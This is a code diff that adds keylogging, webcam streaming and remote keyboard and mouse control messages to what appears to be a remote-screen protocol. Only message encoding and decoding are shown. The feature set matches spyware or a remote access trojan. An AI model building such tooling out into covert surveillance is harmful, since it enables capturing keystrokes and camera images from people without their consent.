@@ -14,6 +14,15 @@ class MessageType(IntEnum):
     HEARTBEAT = 3
     CONFIG = 4
     ERROR = 5
+    KEYLOG = 6
+    WEBCAM_FRAME = 7
+    WEBCAM_START = 8
+    WEBCAM_STOP = 9
+    WEBCAM_ERROR = 10
+    CONTROL_START = 11
+    CONTROL_STOP = 12
+    CONTROL_INPUT = 13
+    DISPLAY_SELECT = 14
 
 class FrameEncoder:
     """Encodes and decodes screen frames"""
@@ -104,3 +113,53 @@ class ProtocolHandler:
         """Create an error message"""
         error_bytes = error_msg.encode('utf-8')
         return struct.pack('!BI', int(MessageType.ERROR), len(error_bytes)) + error_bytes
+    
+    @staticmethod
+    def create_keylog(key_data: str) -> bytes:
+        """Create a keylog message"""
+        key_bytes = key_data.encode('utf-8')
+        return struct.pack('!BI', int(MessageType.KEYLOG), len(key_bytes)) + key_bytes
+    
+    @staticmethod
+    def create_webcam_frame(frame_data: bytes) -> bytes:
+        """Create a webcam frame message"""
+        compressed = zlib.compress(frame_data, level=6)
+        return struct.pack('!BI', int(MessageType.WEBCAM_FRAME), len(compressed)) + compressed
+    
+    @staticmethod
+    def create_control_signal(cmd: str) -> bytes:
+        """Create a control signal (START/STOP)"""
+        cmd_bytes = cmd.encode('utf-8')
+        msg_type = MessageType.CONTROL_START if cmd == "START" else MessageType.CONTROL_STOP
+        return struct.pack('!BI', int(msg_type), len(cmd_bytes)) + cmd_bytes
+    
+    @staticmethod
+    def create_control_input(key_type: str, key_code: int, x: int = 0, y: int = 0, 
+                            button: int = 0, scroll: int = 0) -> bytes:
+        """Create a control input message (keyboard/mouse)"""
+        data = json.dumps({
+            'type': key_type,  # 'key', 'mouse', 'scroll'
+            'key': key_code,
+            'x': x,
+            'y': y,
+            'button': button,
+            'scroll': scroll
+        }).encode('utf-8')
+        return struct.pack('!BI', int(MessageType.CONTROL_INPUT), len(data)) + data
+    
+    @staticmethod
+    def decode_message(data: bytes) -> Tuple[MessageType, bytes]:
+        """Decode any protocol message"""
+        if len(data) < 5:
+            raise ValueError("Message data too short")
+        msg_type = MessageType(data[0])
+        data_len = struct.unpack('!I', data[1:5])[0]
+        if len(data) < 5 + data_len:
+            raise ValueError("Message data incomplete")
+        msg_data = data[5:5+data_len]
+        
+        # Decompress if it's a webcam frame
+        if msg_type == MessageType.WEBCAM_FRAME:
+            msg_data = zlib.decompress(msg_data)
+        
+        return msg_type, msg_data
